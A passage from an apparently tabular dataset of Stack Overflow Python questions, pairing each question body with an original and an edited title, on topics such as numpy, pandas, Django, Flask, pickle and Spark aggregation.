sec.' % t.interval) with Timer() as t: strWithCstr()print('####Request took %.03f sec.' % t.interval) with Timer() as t: read1 = 'x' + MyFile.read(-1)print('file read ##Request took %.03f sec.' % t.interval)with Timer() as t: read2 = 'x' + MyStrIo.read(-1)print('stringIo read ###Request took %.03f sec.' % t.interval)with Timer() as t: read3 = 'x' + MycStrIo.read(-1)print('CString read ####Request took %.03f sec.' % t.interval)MyFile.close()",Python cStringIO take more time than StringIO in writing (performance of string methods)
"Python 2's `exceptions` module is missing in Python3, what to do?"," A friend mentioned that with Python 2, (assuming you have it on your path environment variable, on the commandline) is very useful and knowing it should save him a few minutes of web lookup time a week. I Google the exceptions hierarchy about once a week myself, so this was a helpful reminder for me as well. It is the same documentation that you get with in Python 2, because pydoc uses the exceptions module to provide the online documentation.However, he noted this doesn't work with Python 3. This is because the exceptions module doesn't exist in Python 3.I can see why he likes it - it shows the very useful exceptions hierarchy for quick perusal, and I reference it myself frequently. But the exceptions module with the resulting builtin documentation is missing from Python 3! How can he replace it?To ensure that Stackoverflow has the answer to this question, in general: How does one replace the contents of the exceptions module in Python 2 when moving to Python 3? <code>  $ pydoc exceptions >>> import exceptions>>> help(exceptions) ","Python 2's `exceptions` module is missing in Python3, where did its contents go?"
"Python 2's `exceptions` module is missing in Python3, where did contents go?"," A friend mentioned that with Python 2, (assuming you have it on your path environment variable, on the commandline) is very useful and knowing it should save him a few minutes of web lookup time a week. I Google the exceptions hierarchy about once a week myself, so this was a helpful reminder for me as well. It is the same documentation that you get with in Python 2, because pydoc uses the exceptions module to provide the online documentation.However, he noted this doesn't work with Python 3. This is because the exceptions module doesn't exist in Python 3.I can see why he likes it - it shows the very useful exceptions hierarchy for quick perusal, and I reference it myself frequently. But the exceptions module with the resulting builtin documentation is missing from Python 3! How can he replace it?To ensure that Stackoverflow has the answer to this question, in general: How does one replace the contents of the exceptions module in Python 2 when moving to Python 3? <code>  $ pydoc exceptions >>> import exceptions>>> help(exceptions) ","Python 2's `exceptions` module is missing in Python3, where did its contents go?"
Unpack numpy array by column," If I have a NumPy array, for example 5x3, is there a way to unpack it column by column all at once to pass to a function rather than like this: my_func(arr[:, 0], arr[:, 1], arr[:, 2])? Kind of like *args for list unpacking but by column. <code> ",Unpack NumPy array by column
"django development server, how to stop it when it run in background"," I use a Cloud server to test my django small project, I type in manage.py runserver and then I log out my cloud server, I can visit my site normally, but when I reload my cloud server, I don't know how to stop the development server, I had to kill the process to stop it, is there anyway to stop the development? <code> ","django development server, how to stop it when it run in background?"
is operator in Python returns false, Consider this code: I would expect it to show True. Why does it show False? <code>  class Person(object): def sayHello(self): return 'Hello'print(Person().sayHello is Person().sayHello),Why does the 'is' operator say these methods aren't the same?
Why does the is operator say these methods aren't the same?, Consider this code: I would expect it to show True. Why does it show False? <code>  class Person(object): def sayHello(self): return 'Hello'print(Person().sayHello is Person().sayHello),Why does the 'is' operator say these methods aren't the same?
how to surround selected text in PyCharm like with sublim text," Is there a way to configure PyCharm to be able to surround selected code with parenthesis by just typing on the parenthesis key, like when we use SublimText 2? <code> ",How to surround selected text in PyCharm like with Sublime Text
Tkinter listbox change highlighted item programatically, I have a listbox in Tkinter and I would like to change the item selected programatically when the user presses a key button. I have the keyPressed method but how do I change the selection in the Listbox in my key pressed method? <code> ,Tkinter listbox change highlighted item programmatically
How can i convert the string to a set in python," I have a string I want convert this string to a set I tried the following code: But i got the wrong out as I also used and I got this Is there any other solution for this <code>  sample = ""http://www.stackoverflow.com"" final = {""http://www.stackoverflow.com""} final = set(sample) {u'.', u'/', u':', u'a', u'b', u'c', u'e', u'h', u'i', u'k', u'l', u'n', u'p', u's', u't', u'w'} final = ast.literal_eval(Sample) SyntaxError: invalid syntax",How to put string in a set as an individual item?
Converting ISO 8601 date time to seconds in python," I am trying to add two times together. The ISO 8601 time stamp is '1984-06-02T19:05:00.000Z', and I would like to convert it to seconds. I tried using the Python module iso8601, but it is only a parser.Any suggestions?  <code> ",Converting ISO 8601 date time to seconds in Python
Python: Make division by zero equal to zero, How can I ignore ZeroDivisionError and make n / 0 == 0? <code> ,Make division by zero equal to zero
how to make a Matplotlib 3D Scatter Plot bigger?," I have this piece of code: everything works perfectly fine. The only issue is that the scatter plot that comes out is really tiny. Is there a ay to make it bigger? I looked at the documentation but I wasn't able to find it. <code>  from mpl_toolkits.mplot3d import Axes3Dimport matplotlib.pyplot as pltfig = plt.figure()ax = fig.add_subplot(111, projection='3d')ax.scatter(data.FAC1_1, data.FAC2_1, data.FAC3_1, c='r', marker='o')ax.set_xlabel('X Label')ax.set_ylabel('Y Label')ax.set_zlabel('Z Label')plt.show()",how to make a Matplotlib 3D plot bigger
multiprocessing vs threading vs asyncio in Python 3.4," I found that in Python 3.4 there are few different libraries for multiprocessing/threading: multiprocessing vs threading vs asyncio.But I don't know which one to use or is the ""recommended one"". Do they do the same thing, or are different? If so, which one is used for what? I want to write a program that uses multicores in my computer. But I don't know which library I should learn.  <code> ",multiprocessing vs multithreading vs asyncio in Python 3
multiprocessing vs multithreading vs asyncio in Python 3.4," I found that in Python 3.4 there are few different libraries for multiprocessing/threading: multiprocessing vs threading vs asyncio.But I don't know which one to use or is the ""recommended one"". Do they do the same thing, or are different? If so, which one is used for what? I want to write a program that uses multicores in my computer. But I don't know which library I should learn.  <code> ",multiprocessing vs multithreading vs asyncio in Python 3
"Python: ""from __future__ import* "" reports errors"," I used the following import: but got this error: What does this error mean? <code>  from __future__ import * SyntaxError: future feature * is not defined (<pyshell#0>, line 1)",Why does from __future__ import * raise an error?
"Python zipfile, set compression level"," Python supports zipping files when zlib is available, ZIP_DEFLATEsee:https://docs.python.org/3.4/library/zipfile.htmlThe zip command-line program on Linux supports -1 fastest, -9 best.Is there a way to set the compression level of a zip file created in Python's zipfile module? <code> ","Python zipfile, How to set the compression level?"
Determining transformation matrix from six points in python," I am given the locations of three points: and their transformed counterparts: The affine transformation matrix is of the form such that with you would get: Assuming the transformation is homogeneous (consists of only rotations and translations), how can I determine this transformation matrix?From a CAD program, I know the matrix is: I'd like to know how this can be found. <code>  p1 = [1.0, 1.0, 1.0]p2 = [1.0, 2.0, 1.0]p3 = [1.0, 1.0, 2.0] p1_prime = [2.414213562373094, 5.732050807568877, 0.7320508075688767]p2_prime = [2.7677669529663684, 6.665063509461097, 0.6650635094610956]p3_prime = [2.7677669529663675, 5.665063509461096, 1.6650635094610962] trans_mat = np.array([[, , , ], [, , , ], [, , , ], [, , , ]]) import numpy as npdef transform_pt(point, trans_mat): a = np.array([point[0], point[1], point[2], 1]) ap = np.dot(a, trans_mat)[:3] return [ap[0], ap[1], ap[2]] transform_pt(p1, trans_mat) == p1_primetransform_pt(p2, trans_mat) == p2_primetransform_pt(p3, trans_mat) == p3_prime trans_mat = np.array([[0.866025403784, -0.353553390593, -0.353553390593, 0], [0.353553390593, 0.933012701892, -0.066987298108, 0], [0.353553390593, -0.066987298108, 0.933012701892, 0], [0.841081377402, 5.219578794378, 0.219578794378, 1]])",Determining a homogeneous affine transformation matrix from six points in 3D using Python
Remove empty row from DataFrame in pandas," I have two data frame df1, df2, which I want to combine to the new dataframe df. This however creates an row with all NaN: How can I remove this row, such that df looks like: <code>  >>> from pandas import DataFrame>>> df1 = DataFrame({'col1':[1,2,3], 'col2':[2,3,4]})>>> df2 = DataFrame({'col1':[4,2,5], 'col2':[6,3,5]})>>> df = df2[~df2.isin(df1)]>>> df col1 col20 4 61 NaN NaN2 5 5 >>> df col1 col20 4 62 5 5",Remove row with all NaN from DataFrame in pandas
How to use paramiko logging?, I'm using Paramiko in Python to run command on a box through SSH. How to use Paramiko logging? I mean force it to make logs (in a file or terminal) and set the log level. <code> ,How to use Paramiko logging?
How to replace all \W with exception of '-' with regular expression?, I want replace all \W not letters with exception of - dash to spaces i.e:black-white will give black-whiteblack#white will give black whiteI know regular expression very well but I have no idea how to deal with it.Consider that I want use Unicode so [a-zA-Z] is not \w like in English only.Consider that I prefer Python re syntax but can read other suggestions. <code> ,How to replace all \W (none letters) with exception of '-' (dash) with regular expression?
Python: How to overload print function to expand its functionality?," I am wondering if the build-in function print could be overridden so that the following statement will write to the console and a file at the same time. Also, may I know if it is possible to modify the source code of the build-in print function? <code>  print(""test0"",""test1"",""test2"",sep='\n') ",How to overload print function to expand its functionality?
"Using troposphere for cloud formation, how do I add ""propogate at launch"" to tags"," I'm using the python module troposphere to generate tags in my cloud formation template. The current script generates: but I need to generate The portion of the script that applies is: <code>  ""Tags"": [{""Key"":""Name"", ""Value"":""MyTagName""}, {""Key"":""Version"", ""Value"":""123456""}] ""Tags"":[{""Key"":""Name"", ""Value"":""MyTagName"", ""PropagateAtLaunch"":""true""}, {""Key"":""Version"", ""Value"":""123456"", ""PropagateAtLaunch"":""true""}] asg = autoscaling.AutoScalingGroup(""MyASG"") asg.Tags = Tags(Name = ""MyTagName"", Version = ""123456"") t.add_resource(asg)","Using troposphere for cloud formation, how do I add ""propagate at launch"" to tags"
Pygame catching Enter key," I am trying to catch Enter button with pygame, not Enter button on keypad, which I want is the Enter button under Backspace button. They are not same, because when I catch Enter button on keypad, other Enter button is not working. http://www.pygame.org/docs/ref/key.htmlThere is a documentation about keys, but there is only keypad Enter button. I tried these codes: This working for keypad Enter button, but other Enter button is not working: I tried to catch another Enter button with these codes(hopeless): But of course an error appears: Couldn't figure out how to catch Enter button under Backspace. <code>  if event.type==pygame.KEYDOWN: if event.key==pygame.K_KP_ENTER: #some codes if event.type==pygame.KEYDOWN: if event.key==pygame.K_ENTER: #some codes AttributeError: 'module' object has no attribute 'K_ENTER'",Pygame catching Enter Button
Translating a line of code from python to c++," I'm currently making a tic-tac-toe program with AI and i'm having a bit of a trouble translating this line of code (python) : into C++any suggestions? <code>  RANKS = dict([(4,3), # center = 3 (0,2),(2,2),(6,2),(8,2), # corners = 2 (1,1),(3,1),(5,1),(7,1)]) # sides = 1",C++ equivalent of Python dictionaries
Python Matplotlib Plot a list of tuples," I have a list of tuples with the tuples being (minTemp, averageTemp, maxTemp).I would like to plot a line graph of each of these elements in the tuple, on the same matplotlib figure.How can this be done? <code> ",How do I plot a list of tuples with matplotlib?
any way using python libraries to plot horizontal bars sharing same y axis like in this example?," I would like to plot two horizontal bar charts sharing same y axis. For example, the following question shows how to achieve this in R:Two horizontal bar charts with shared axis in ggplot2 (similar to population pyramid)How can I create a similar plot with Python?The plot from the question above looks like this:Here is the list of states used in the graph above (the y axis): Here is the list of the numbers of sales staff for each state: The sales figures can be random. <code>  [""AK"", ""TX"", ""CA"", ""MT"", ""NM"", ""AZ"", ""NV"", ""CO"", ""OR"", ""WY"", ""MI"", ""MN"", ""UT"", ""ID"", ""KS"", ""NE"", ""SD"", ""WA"", ""ND"", ""OK""] [20,30,40,10,15,35,18,25,22,7,12,22,3,4,5,8,14,28,24,32]",Using Python libraries to plot two horizontal bar charts sharing same y axis
Unable to load files using pickle and multipile modules," I'm trying to create a user system, which uses a setting and Gui module, and when the GUI module requests for the file to load up using pickle, I keep getting an attribute error. this is from the settings module: and this is the GUI module: each user is a class and are put into a list and then the list is saved using pickle when I load up just the settings file and verify the login everything works fine but when I open up the GUI module and try to verify it doesn't let me, the error I'm getting: <code>  import pickleimport hashlibclass User(object): def __init__(self, fname, lname, dob, gender): self.firstname = fname self.lastname = lname self._dob = dob self.gender = gender self.type = 'General' self._username = '' self._hashkey = '' def Report(self): print(""Full Name: {0} {1}\nDate of Birth: {2}\nGender: {3}\nAccess Level: {4}"".format(self.firstname,self.lastname, self._dob, self.gender, self.type)) print(self._username) def Genusername(self): self._username = str(str(self._dob)[:2] + self.firstname[:2] + self.lastname[:2]) saveUsers(users) def Genhashkey(self, password): encoded = password.encode('utf-8','strict') return hashlib.sha256(encoded).hexdigest() def Verifypassword(self, password): if self._hashkey == self.Genhashkey(password): return True else: return Falseclass SAdmin(User): def __init__(self, fname, lname, dob, gender): super().__init__(fname, lname, dob, gender) self.type = 'Stock Admin'class Manager(User): def __init__(self, fname, lname, dob, gender): super().__init__(fname, lname, dob, gender) self.type = 'Manager'def saveUsers(users): with open('user_data.pkl', 'wb') as file: pickle.dump(users, file, -1) # PICKLE HIGHEST LEVEL PROTOCOLdef loadUsers(users): try: with open('user_data.pkl', 'rb') as file: temp = pickle.load(file) for item in temp: users.append(item) except IOError: saveUsers([])def userReport(users): for user in users: print(user.firstname, user.lastname)def addUser(users): fname = input('What is your First Name?\n > ') lname = input('What is your Last Name?\n > ') dob = int(input('Please enter your date of birth in the following format, example 12211996\n> ')) gender = input(""What is your gender? 'M' or 'F'\n >"") level = input(""Enter the access level given to this user 'G', 'A', 'M'\n > "") password = input(""Enter a password:\n > "") if level == 'G': usertype = User if level == 'A': usertype = SAdmin if level == 'M': usertype = Manager users.append(usertype(fname, lname, dob, gender)) user = users[len(users)-1] user.Genusername() user._hashkey = user.Genhashkey(password) saveUsers(users)def deleteUser(users): userReport(users) delete = input('Please type in the First Name of the user do you wish to delete:\n > ') for user in users: if user.firstname == delete: users.remove(user) saveUsers(users)def changePass(users): userReport(users) change = input('Please type in the First Name of the user you wish to change the password for :\n > ') for user in users: if user.firstname == change: oldpass = input('Please type in your old password:\n > ') newpass = input('Please type in your new password:\n > ') if user.Verifypassword(oldpass): user._hashkey = user.Genhashkey(newpass) saveUsers(users) else: print('Your old password does not match!')def verifyUser(username, password): for user in users: if user._username == username and user.Verifypassword(password): return True else: return False if __name__ == '__main__': users = [] loadUsers(users) from PyQt4 import QtGui, QtCoreimport Settingsclass loginWindow(QtGui.QDialog): def __init__(self): super().__init__() self.initUI() def initUI(self): self.lbl1 = QtGui.QLabel('Username') self.lbl2 = QtGui.QLabel('Password') self.username = QtGui.QLineEdit() self.password = QtGui.QLineEdit() self.okButton = QtGui.QPushButton(""OK"") self.okButton.clicked.connect(self.tryLogin) self.cancelButton = QtGui.QPushButton(""Cancel"") grid = QtGui.QGridLayout() grid.setSpacing(10) grid.addWidget(self.lbl1, 1, 0) grid.addWidget(self.username, 1, 1) grid.addWidget(self.lbl2, 2, 0) grid.addWidget(self.password, 2, 1) grid.addWidget(self.okButton, 3, 1) grid.addWidget(self.cancelButton, 3, 0) self.setLayout(grid) self.setGeometry(300, 300, 2950, 150) self.setWindowTitle('Login') self.show() def tryLogin(self): print(self.username.text(), self.password.text()) if Settings.verifyUser(self.username.text(),self.password.text()): print('it Woks') else: QtGui.QMessageBox.warning( self, 'Error', 'Incorrect Username or Password')class Window(QtGui.QMainWindow): def __init__(self): super().__init__() if __name__ == '__main__': app = QtGui.QApplication(sys.argv) users = [] Settings.loadUsers(users) if loginWindow().exec_() == QtGui.QDialog.Accepted: window = Window() window.show() sys.exit(app.exec_()) Traceback (most recent call last): File ""C:\Users`Program\LoginGUI.py"", line 53, in <module> Settings.loadUsers(users) File ""C:\Users\Program\Settings.py"", line 51, in loadUsers temp = pickle.load(file)AttributeError: Can't get attribute 'Manager' on <module '__main__' (built-in)>",Unable to load files using pickle and multiple modules
How to print variable inside quotation marks? (Python)," I would like to print a variable within quotation marks. I want to print out ""variable""I have tried a lot, what worked was: but then I have two spaces in the output: How can I print something within a pair of quotation marks? <code>  print('""', variable, '""') "" variable """,How to print variable inside quotation marks?
How to print variable inside quotation marks?," I would like to print a variable within quotation marks. I want to print out ""variable""I have tried a lot, what worked was: but then I have two spaces in the output: How can I print something within a pair of quotation marks? <code>  print('""', variable, '""') "" variable """,How to print variable inside quotation marks?
Suggestions for library or approach for simple addition and subtraction tuples of X and Y coordinates," I have been studying Python for about 6 months now, and although I have a lot of factual knowledge, I still have very little experiential programming knowledge (in Python or otherwise). As a result, I'm concerned that 1. I am reinventing the wheel and 2. my attempts at solving my problem on my own are going to be fraught with issues I am not aware of. ProblemThe problem is simple. I have points composed of X and Y coordinates. I want to be able to simply add and subtract them together and test for equality: An added difficulty is I have at least two different kinds of points, and I need to be able to convert between them and test for coordinate equality between them as well: These types of points are ""exactly the same"" animals, I just need to be able to differentiate between them. Some more possibly relevant information: multiple object references to the points will be held in many containers, and there will only be tens of thousands of them at most. Solution attemptI have tried using collections.namedtuple: This is nice because testing for equality of the two different types of points is trivial, and ""converting"" works too: But my test code will fail because adding tuples together behaves differently than the desired result: How can I get this working the way I want? I am not married to this approach at all, by the way, so tell me to throw it away completely if that's the best thing. Other options I have consideredIndependently implement the behavior by writing my Point classes, which doesn't seem too hard - but I feel like I'd be reinventing a wheel that has surely been created millions of times. Use an abstract base class and just provide the requisite methods - perhaps numbers.Complex use a numpy.matrix (or array) for the points  <code>  a = Point(1,1)b = Point(2,2)assert a + a == b r = RegularPoint(1,1)i = InterfacePoint(1,1)ri = RegularPoint(i)assert ri == i from collections import namedtuple as ntPointA = nt('PointA','x y')PointB = nt('PointB','x y') a = PointA(1,1)b = PointB(1,1)assert a == baB = PointB(*a)assert aB == a assert a + a == (1, 1, 1, 1)",Simple addition and subtraction for tuples of X and Y coordinates
Python - MySQLdb command to avoid duplicate entries in the MySQL database," I am using the Python-MySQL (MySQLdb) library to insert values into a database. I want to avoid duplicate entries from being inserted into the database, so I have added the unique constraint to that column in MySQL. I am checking for duplicates in the title column. In my Python script, I am using the following statement: Now when a duplicate entry is added to the database, it will produce an error. I do not want an error message to appear; I just want that if a duplicate entry is found then it should simply not enter that value into the database. How do I do this? <code>  cursor.execute (""""""INSERT INTO `database` (title, introduction) VALUES (%s, %s)"""""", (title, pure_introduction))",How to avoid duplicate entries in a MySQL database without throwing an error
"Python - max() give ""int"" not callable error in my function"," I have a problem using max() inside my function. When a create a list with integers, max function works good. However when a create a list in my function and then using max() with my integer list then it gives ""TypeError: 'int' object is not callable"" error.Where am I wrong and how can I fix it? <code>  >>> a = [1,2,3,4,5] # A simple list>>> max(a) # It works fine>>> 5>>> def palen(num):... min = 10**(num-1)... max = (10**num)-1... a=[] # Another list... mul=0... for i in range(max,min-1,-1):... for j in range (max,min-1,-1):... mul=i*j... if str(mul)==str(mul)[::-1]:... a.append(mul)... return max(a)...>>> palen(2)Traceback (most recent call last): File ""<input>"", line 1, in <module> File ""<input>"", line 11, in palenTypeError: 'int' object is not callable","max() give ""int"" not callable error in my function"
having problems with os.mkdir," working on a python project, and what it does is it looks at the index of lifehacker.com, then finds all tags with the class ""headline h5 hover-highlight entry-title"", then it creates files for each directory. But the only problem is that when i run it, i get OSError: [Errno 2] No such file or directory: ""/home/root/python/The Sony Smartwatch 3: A Runner's Perspective (Updated: 1/5/2015)""help would be lovely, thanks!heres my code atm: <code>  import reimport osimport urllib2from bs4 import BeautifulSoupfrom mechanize import Browserurl = ""http://lifehacker.com/""url_open = urllib2.urlopen(url)soup = BeautifulSoup(url_open.read())link = soup.findAll(""h1"",{""class"": ""headline h5 hover-highlight entry-title""})file_directory = ""/home/root/python/""for i in link: os.mkdir(os.path.join(file_directory, str(i.text))) print ""Successfully made directory(s)"", i.text, ""!""else: print ""The directory"", i.text, ""either exists, or there was an error!""","""No such file or directory"" from os.mkdir"
Difference between list(numpy_array) and numpy_array.tolist() in python," What is the difference between applying list() on a numpy array vs. calling tolist()? I was checking the types of both outputs and they both show that what I'm getting as a result is a list, however, the outputs don't look exactly the same. Is it because that list() is not a numpy-specific method (i.e. could be applied on any sequence) and tolist() is numpy-specific, and just in this case they are returning the same thing?Input: Output: Input: Output: Input: Output: <code>  points = numpy.random.random((5,2))print ""Points type: "" + str(type(points)) Points type: <type 'numpy.ndarray'> points_list = list(points)print points_listprint ""Points_list type: "" + str(type(points_list)) [array([ 0.15920058, 0.60861985]), array([ 0.77414769, 0.15181626]), array([ 0.99826806, 0.96183059]), array([ 0.61830768, 0.20023207]), array([ 0.28422605, 0.94669097])]Points_list type: 'type 'list'' points_list_alt = points.tolist()print points_list_altprint ""Points_list_alt type: "" + str(type(points_list_alt)) [[0.15920057939342847, 0.6086198537462152], [0.7741476852713319, 0.15181626186774055], [0.9982680580550761, 0.9618305944859845], [0.6183076760274226, 0.20023206937408744], [0.28422604852159594, 0.9466909685812506]]Points_list_alt type: 'type 'list''",Difference between list(numpy_array) and numpy_array.tolist()
How to setup different subdomains in Flask (w/ blueprints)?," I have a Flask application running at https://app.mydomain.com.The blueprints look like this: The URLs look like this:https://app.mydomain.comhttps://app.mydomain.com/accounthttps://app.mydomain.com/users...I want to move the api_1_0 route from https://app.mydomain.com/api/v1.0 to https://api.mydomain.com, how should I modify the routes and how should I set app.config['SERVER_NAME']?example.com (without any subdomain) is another site entirely, otherwise I would get rid of the app subdomain.So, I want app to be the default subdomain for all blueprints except api_1_0 which should be api. <code>  app.register_blueprint(main)app.register_blueprint(account, url_prefix='/account')app.register_blueprint(users, url_prefix='/users')app.register_blueprint(boxes, url_prefix='/boxes')app.register_blueprint(api_1_0, url_prefix='/api/v1.0')",How to setup different subdomains in Flask (using blueprints)?
How can you style Django's file upload form button?," I am attempting to style my Django file upload button, but since it's handled through the form and not explicitly written in the HTML within the template I cannot style it directly with HTML and CSS like I can for other buttons of type input. I've attempted to add my CSS class within my forms.py, but it is placing the vanilla default Django file upload button on top of my CSS styled button.My code is as follows: I also tried defining a widget within my Meta class like so: but that had the same effect as my first attempt.Is there a different way of accomplishing this or are there some logical errors that you can spot within my code? <code>  class FileUploadForm(forms.Form): docFile = forms.FileField( label = ""Select a CSV file"", ) class Meta: model = FileUpload fields = ('docFile') def __init__(self, *args, **kwargs): super(FileUploadForm, self).__init__(*args, **kwargs) self.fields['docFile'].widget.attrs.update({'class': 'my_class'}) class Meta: model = FileUpload widgets = { 'docFile': forms.FileInput(attrs={'class': 'my_class'}), }",How can you style Django's file picker form button?
dir inside function pyhton," Python has a nice feature that gives the contents of an object, like all of it's methods and existing variables, called dir(). However when dir is called in a function it only looks at the scope of the function. So then calling dir() in a function has a different value than calling it outside of one. For example: Is there a way I can change the scope of the dir in d? <code>  dir()> ['__builtins__', '__doc__', '__loader__', '__name__', '__package__', '__spec__']def d(): return dir()d()> []",dir inside function
Unittest Matplotlib figure," I'm working on a python (2.7) program that produce a lot of different matplotlib figure (the data are not random). I'm willing to implement some test (using unittest) to be sure that the generated figures are correct. For instance, I store the expected figure (data or image) in some place, I run my function and compare the result with the reference. Is there a way to do this ? <code> ",How can I write unit tests against code that uses matplotlib?
django run localhost from another computer connnected to another network, I am running my django project in localhost and it works fine..For test purpose I want to run my localhost from another computer connected in the same network.I have done python manage.py runserver 'my ip address'That works fine too.. Is there any way that I can access my localhost from another computer connected to another network?Like I am connected to A network and running my localhost and my friend is connected to B network. Suppose he wants to access my localhost and see my project running then is it possible to access localhost of a computer from another computer connected to another project? <code> ,django run localhost from another computer connected to another network
Python: How to view an RGB image with pylab," I'm trying to view an 32x32 pixel RGB image in CIFAR-10 format. It's a numpy array where pixel values (uint8) are arranged as follows: ""The first 1024 bytes are the red channel values, the next 1024 the green, and the final 1024 the blue. The values are stored in row-major order, so the first 32 bytes are the red channel values of the first row of the image."" Thus, the original image shape is: I reshape it like this: However, when I try in iPython console, I see 3 by 3 tiles of the original image:I expected to see a single image of a car instead.I saw this question here, but I'm not sure what are they doing there, and if it's relevant to my situation.  <code>  numpy.shape(image)(3072L,) im = numpy.reshape(image, (32,32,3)) imshow(im)",How to view an RGB image with pylab
dict_items object has no attribute 'sort'Replace Min," First of all I am new to Python. I am using PTVS http://pytools.codeplex.com/. Next I installed reportlab. Then I run a sample demo at https://github.com/nakagami/reportlab/blob/master/demos/colors/colortest.py#L68 But at line, I am getting error, dict_items object has no attribute sort <code>  all_colors = reportlab.lib.colors.getAllNamedColors().items()all_colors.sort() # alpha order by name",dict_items object has no attribute 'sort'
Special Characters in Python Arrays," I am making a set in Python to house all the symbols on my keyboard, but obviously a few pose some issues. Is there a way to get them all in there without encountering problems?Here is my set: To get around commenting out most of it, since in Python # is to comment, I enclosed everything like so: Which works for that character, but now I can already see an issue when I come across the ' and \. Is there a better way to make this set? <code>  symbols = {`,~,!,@,#,$,%,^,&,*,(,),_,-,+,=,{,[,},},|,\,:,;,"",',<,,,>,.,?,/} symbols = {'`','~','!','@','#','$','%','^','&','*','(',')','_','-','+','=','{','[','}','}','|','\',':',';','""',''','<',',','>','.','?','/'}",Special Characters in string literals
How to use cProfile for django app while running on gunicorn, How can I profile a Django application while running on gunicorn using python cProfile.I can profile in development mode:python -m cProfile -o sample.profile manage.py runserverBut what should I do when it is running in production server using gunicorn? <code> ,How can I use python's cProfile to profile a django app while running on gunicorn
How do I install Numpy for Python 2.7?," I am trying to install numpy for python 2.7, I've downloaded the zip, unzipped it and was expecting a Windows download file (.exe), but there isn't one. Which of these files do I use to install it? I tried running the setup.py file but don't seem to be getting anywhere. Thanks!!! <code> ",How do I install Numpy for Python 2.7 on Windows?
Can we Zoom the browser window in python selenium webdriver ?," I am trying to ZOOM IN and ZOOM OUT the Chrome( selenium webdriver) only using keyboard. I have tried -- but it is not working. Need answer in python.  <code>  from selenium.webdriver.common.keys import Keysdriver.find_element_by_tag_name(""body"").send_keys(Keys.CONTROL,Keys.SUBTRACT). ",Can we Zoom the browser window in python selenium webdriver?
Can someone explain to me this really basic python code?," Recently, I went to a job interview for a Python developer position. The following code was one of the questions. I just had to write the output. The output is: I'm trying to understand why the first list, list1, has the 'a' value. EDITI checked all the links and found out its a python ""gotcha"" for begginers, but want to thank the answers, cant choose both so im going with the first one. <code>  def extendList(val,list=[]): list.append(val) return listlist1 = extendList(10)list2 = extendList(123,[])list3 = extendList('a')print ""list1 = %s "" %list1print ""list2 = %s "" %list2print ""list2 = %s "" %list3 list1 = [10, 'a'] list2 = [123] list2 = [10, 'a']",Can someone explain this really basic Python code to me?
"In Python, how can I conditionally add in a mixin to the current class on instantiation?"," I'd like to have a class that adds in mixins based on arguments passed to the constructor. This is what I've tried: The only problem with this seems to be that __init__ doesn't get called, so the print_name methods will not work.How do I get __init__ on Sub to fire?orIs there a better way to do this? <code>  class MixinOne(object): def print_name(self): print(""{} is using MixinOne."".format(self.name))class MixinTwo(object): def print_name(self): print(""{} is using MixinTwo."".format(self.name))class Sub(object): def __new__(cls, *args, **kwargs): mixin = args[1] if mixin == 'one': bases = (MixinOne,) + cls.__bases__ elif mixin == 'two': bases = (MixinTwo,) + cls.__bases__ return object.__new__(type('Sub', bases, dict(cls.__dict__))) def __init__(self, name, mixin): print('In Sub.__init__') self.name = name",How can I conditionally add in a mixin to the current class on instantiation?
"Sorting sys.path: first virualenv, then /usr", Why does sys.path contain /usr/... before directories from my virtualenv?I create the virtualenv with --system-site-packagesThe sys.path looks like this at the moment: I want all paths outside my virtualenv (/usr...) to be below the paths of the virtualenv.Otherwise crazy things happen: I install a package with pip. Pip tells me that the new version is installed (pip freeze | grep -i ...) but the import does use the one from /usr/lib/python2.7/site-packagesI can't use --no-site-packages in my context.Is there a way to sort sys.path?Why I use system-site-packagesThere seems to be no straight forward way to make single libraries from the global site-packages available in the virtualenv. See this question:make some modules from global site-packages available in virtualenvThere are packages like python-gtk which are very hard to install in a virtualenv. <code>  /home/my-virtualenv/src/foo/usr/lib/python2.7/site-packages <--- /usr paths should be below /usr/lib64/python2.7/site-packages/home/my-virtualenv/lib/python27.zip/home/my-virtualenv/lib64/python2.7/home/my-virtualenv/lib64/python2.7/plat-linux2/home/my-virtualenv/lib64/python2.7/lib-tk/home/my-virtualenv/lib64/python2.7/lib-old/home/my-virtualenv/lib64/python2.7/lib-dynload/usr/lib64/python2.7/usr/lib/python2.7/usr/lib64/python2.7/lib-tk/home/my-virtualenv/lib/python2.7/site-packages,"Sorting sys.path: first virtualenv, then /usr"
Explain the aggregate functionality in Spark using python," I am looking for some better explanation of the aggregate functionality that is available via spark in python. The example I have is as follows (using pyspark from Spark 1.2.0 version) Output: I get the expected result (10,4) which is sum of 1+2+3+4 and 4 elements. If I change the initial value passed to the aggregate function to (1,0) from (0,0) I get the following result Output: The value increases by 9. If I change it to (2,0), the value goes to (28,4) and so on.Can someone explain to me how this value is calculated? I expected the value to go up by 1 not by 9, expected to see (11,4) instead I am seeing (19,4).  <code>  sc.parallelize([1,2,3,4]).aggregate( (0, 0), (lambda acc, value: (acc[0] + value, acc[1] + 1)), (lambda acc1, acc2: (acc1[0] + acc2[0], acc1[1] + acc2[1]))) (10, 4) sc.parallelize([1,2,3,4]).aggregate( (1, 0), (lambda acc, value: (acc[0] + value, acc[1] + 1)), (lambda acc1, acc2: (acc1[0] + acc2[0], acc1[1] + acc2[1]))) (19, 4)",Explain the aggregate functionality in Spark (with Python and Scala)
Explain the aggregate functionality in Spark," I am looking for some better explanation of the aggregate functionality that is available via spark in python. The example I have is as follows (using pyspark from Spark 1.2.0 version) Output: I get the expected result (10,4) which is sum of 1+2+3+4 and 4 elements. If I change the initial value passed to the aggregate function to (1,0) from (0,0) I get the following result Output: The value increases by 9. If I change it to (2,0), the value goes to (28,4) and so on.Can someone explain to me how this value is calculated? I expected the value to go up by 1 not by 9, expected to see (11,4) instead I am seeing (19,4).  <code>  sc.parallelize([1,2,3,4]).aggregate( (0, 0), (lambda acc, value: (acc[0] + value, acc[1] + 1)), (lambda acc1, acc2: (acc1[0] + acc2[0], acc1[1] + acc2[1]))) (10, 4) sc.parallelize([1,2,3,4]).aggregate( (1, 0), (lambda acc, value: (acc[0] + value, acc[1] + 1)), (lambda acc1, acc2: (acc1[0] + acc2[0], acc1[1] + acc2[1]))) (19, 4)",Explain the aggregate functionality in Spark (with Python and Scala)
